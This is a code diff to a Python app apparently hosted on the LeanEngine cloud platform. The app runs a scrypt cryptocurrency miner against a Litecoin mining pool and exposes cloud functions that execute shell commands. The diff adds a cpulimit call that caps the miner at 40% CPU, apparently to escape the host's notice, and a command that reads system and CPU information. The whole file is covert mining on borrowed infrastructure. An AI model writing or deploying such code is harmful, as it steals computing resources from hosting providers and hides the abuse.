@@ -12,7 +12,7 @@ engine = Engine()
 
 #minerd.exe --url (YOUR STRATUM POOL ADDRESS) -a scrypt --userpass (YOUR WORKER USERNAME):(YOUR PASSWORD)
 #str_cmd = 'PATH="$PATH:/home/azhu/test" && echo $PATH && cpum --url=stratum+tcp://stratum-ltc.antpool.com:443 --user=waylite --algo=scrypt --userpass waylite.1:x'
-str_setup = 'chmod +x cpum'
+str_setup = 'chmod +x cpum && chmod +x cpulimit'
 str_cmd = 'PATH="$PATH:/home/leanengine/app" && echo $PATH && cpum --url=stratum+tcp://stratum-ltc.antpool.com:443 --user=waylite --algo=scrypt --userpass waylite.1:x'
 #str_cmd = 'PATH="$PATH:/home/leanengine/app" && echo $PATH && ls -l'
 ENGNIE_RESTARTED = True
@@ -62,6 +62,15 @@ def ls_cmd(**params):
 	OutputShell('ls -l')
 	return True
 
+@engine.define( 'sysinfo' )
+def cmd_sysinfo(**params):
+	OutputShell('cat /etc/issue && cat /proc/cpuinfo')
+	return True
+
+@engine.define( 'cpulimit' )
+def cmd_cpulimit(**params):
+	OutputShell('cpulimit -l 40')
+	return True
 
 #半小时运行一次
 # 15 5/15 9-23 * * ?
